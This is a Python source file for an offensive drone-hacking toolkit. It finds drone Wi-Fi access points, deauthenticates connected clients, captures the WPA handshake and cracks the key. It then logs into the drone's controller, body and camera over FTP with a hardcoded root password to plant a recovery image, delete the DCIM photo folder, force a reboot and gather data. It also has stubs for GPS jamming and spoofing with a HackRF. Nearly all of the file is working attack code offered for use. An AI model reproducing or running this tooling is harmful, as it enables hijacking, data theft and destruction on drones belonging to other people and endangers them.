from accesspoint import AccessPoint
from target import Target
from ftplib import FTP
import attacks
import commands
import re
import time
import sys

class Environment:
    
    def __init__(self, d=None, s=None, v=False):
        
        self.device = d
        self.ssid = s
        self.accesspoints = None
        self.targets = None
        self.mondevice = None
        self.ftp = None
        self.monitormode = False
        self.initialized = False
        self.verbose = v
        
        if (d and s):
            self.initialize(d, s)
        
    def initialize(self, d, s):
        
        if not d and not s: raise ValueError('Must provide valid device and SSID.')
        if not d: raise ValueError('Must provide valid device.')
        if not s: raise ValueError('Must provide valid SSID.')
        
        self.device = d
        self.ssid = s
        self.accesspoints = self.__getaccesspoints(d, s)
        self.initialized = True
        
        if self.verbose:
            print "Environment initialized!"
            
        return self.accesspoints
            
            
    def setdevice(self, d):
        self.device = d
        self.initialized = False
        
        
    def setssid(self, s):
        self.ssid = s
        self.initialized = False
            
            
    def crackdrone(self, index):
        
        if index < len(self.accesspoints):
            print 'Cracking ' + str(self.accesspoints[index])
            self.__startmonitormode(index)
            self.__gettargets(index)
            self.__deauthtargets()
            self.accesspoints[index].key = self.__crackpsk(index)
            self.__stopmonitormode()
            return self.accesspoints[index].key
        else:
            print 'Out of bounds! Only ' + len(self.accesspoints) + ' drones found.'
            
            
    def jamgps(self):
        out = commands.hackrftransfer()
        
        
    def spoofgps(self):
        # TODO: implement command to generate steady clock signal to HackRF
        commands.hackrftransfer()
    

    def plantrecoveryimage(self, ip='192.168.1.3'):
        
        try:
            self.__openftp(ip)
            attacks.plantrecoveryimage(self.ftp)
        except Exception as e:
            raise StandardError(str(e))
        finally:
            self.__closeftp()
            
            
    def cleardcim(self, ip='192.168.1.3'):
        
        try:
            self.__openftp(ip)
            attacks.cleardcim(self.ftp)
        except Exception as e:
            raise StandardError(str(e))
        finally:
            self.__closeftp()
            
            
    def softreboot(self, ip='192.168.1.1', user='root', password='Big~9China'):
        
        try:
            self.__openftp(ip, user, password)
            attacks.softreboot(self.ftp)
        except Exception as e:
            raise StandardError(str(e))
        finally:
            self.__closeftp()
        
                       
    def gatherintel(self, controllerip='192.168.1.1', droneip='192.168.1.2', cameraip='192.168.1.3'):
        
        hosts = [(controllerip, 'root', 'Big~9China', attacks.gatherintelcontroller),
                 (droneip, 'root', 'Big~9China', attacks.gatherinteldrone),
                 (cameraip, '', '', attacks.gatherintelcamera)]
        
        for host in hosts:
            try:
                self.__openftp(host[0], host[1], host[2])
                host[3](self.ftp)
            except Exception as e:
                raise StandardError(str(e))
            finally:
                self.__closeftp()
        
        
    def deauth(self, index, duration=20, exceptions=[]):
        
        out = commands.getmymacs()
        mymacs = map(lambda filtered: (filtered.split(' '))[1], [x.strip() for x in filter(lambda line: line, out.split('\n'))])
        
        self.__startmonitormode(index)
        self.__gettargets(index)
        
        for x in range(duration):
            print 'deauth ' + str(x)
            self.__deauthtargets(exceptions + mymacs)
            time.sleep(1)
            
        self.__stopmonitormode()
            
    def __getaccesspoints(self, device, ssid):

        out = commands.searchssid(device, ssid, after=2)
        
        def createaccesspoint(ssidinfo):
            ssid = ''.join(filter(lambda line: 'SSID:' in line, ssidinfo.split('\n'))).replace('SSID:','').strip()
            channel = ''.join(filter(lambda line: 'DS Parameter set: channel' in line, ssidinfo.split('\n'))).replace('DS Parameter set: channel','').strip()
            return AccessPoint(s=ssid, c=channel)
        
        accesspoints = map(lambda ssidinfo: createaccesspoint(ssidinfo), out.split('--'))
        
        if self.verbose:
            print 'FOUND: ' + str(map(lambda accesspoint: str(accesspoint), accesspoints))

        return accesspoints
    
    
    def getaccesspoint(self, ssid):
        
        for ap in self.accesspoints:
            if ssid == ap.ssid:
                return ap
        return None
    
    
    def __deauthtargets(self, exceptions=[]):
        
        for target in self.targets:
            if target.mac not in exceptions:
                print str(target.mac) + ' deauthenticated!'
                commands.deauth(self.mondevice, target.accesspoint.mac, target.mac)
            else:
                print str(target) + ' skippped!'
    
    
    def __crackpsk(self, index):
        
        time.sleep(10)
        out = None
        for x in range(10):
            if out and (('KEY FOUND!' in out) or x > 10):
                results = re.search(r'KEY FOUND! \[\s(.*)\s\]', out)
                if results:
                    return results.group(1)
                else:
                    print 'Could not crack key. Try running aircrack-ng separately'
                    break
            else:
                accesspoint = self.accesspoints[index]   
                out = commands.crackpsk(accesspoint.mac, accesspoint.dumpfilename)
                time.sleep(3)
                if 'No valid WPA handshakes found' in out:
                    print 'No handshake found. Still searching...'
                else:
                    print 'Handshake found. Crack unsuccessful. Trying again...'
                    
                    
    def __gettargets(self, index):
        
        accesspoint = self.accesspoints[index]
        commands.cleanfiles(accesspoint.dumpfilename, wildcard=True)
        commands.sniffssid(self.mondevice, accesspoint.ssid, accesspoint.channel, accesspoint.dumpfilename)
        
        time.sleep(20)
        
        try:
            with open(accesspoint.dumpfilename + '-01.csv', 'r') as f:
                lines = f.readlines()
                accesspoint.mac = filter(lambda line: accesspoint.ssid in line, lines)[0].split(',')[0]
                #accesspoint.mac = ((lines[2].split(','))[0]).strip()
                cleanlines = lines[lines.index('Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs\r\n'):]
                print cleanlines
                #self.targets = map(lambda client: Target(client.split(',')[0], accesspoint), filter(lambda fullline: accesspoint.mac in fullline, filter(lambda line: len(line.strip()) > 1, lines[5:])))
                self.targets = map(lambda client: Target(client.split(',')[0], accesspoint), filter(lambda fullline: accesspoint.mac in fullline, cleanlines))
                print 'TARGETS FOUND' + str(self.targets)
                for target in self.targets:
                    print str(target)
        except IOError as e:
            print str(e)
    
    
    def __openftp(self, ip='192.168.1.1', user='', password=''):
        self.ftp = FTP(ip, user, password)
    
    def __closeftp(self):
        if self.ftp: self.ftp.quit()
    
    
    def __startmonitormode(self, index):
        
        accesspoint = self.accesspoints[index]
        commands.airmoncheckkill()
        commands.disabledevice(self.device)
        out = commands.startmonitormode(self.device, accesspoint.channel)

        try:
            #self.mondevice = re.match(r'(.*)](.*)\)', ''.join(filter(lambda line: 'monitor mode enabled' in line, out.split('\n')))).groups('0')[1]
            self.mondevice = 'mon0'
            self.monitormode = True
            print 'Monitor mode started on ' + self.mondevice + '...'
        except AttributeError:
            print 'Error entering monitor mode...'
        except:
            print("Unexpected error:", sys.exc_info()[0])
            raise
        
        
    def __stopmonitormode(self):
        
        commands.stopmonitormode(self.mondevice)
        commands.enabledevice(self.device)
        commands.startnetworkmanager()
        
        self.monitormode = False
        
        print 'Monitor mode stopped on ' + self.mondevice + '...'
    
    
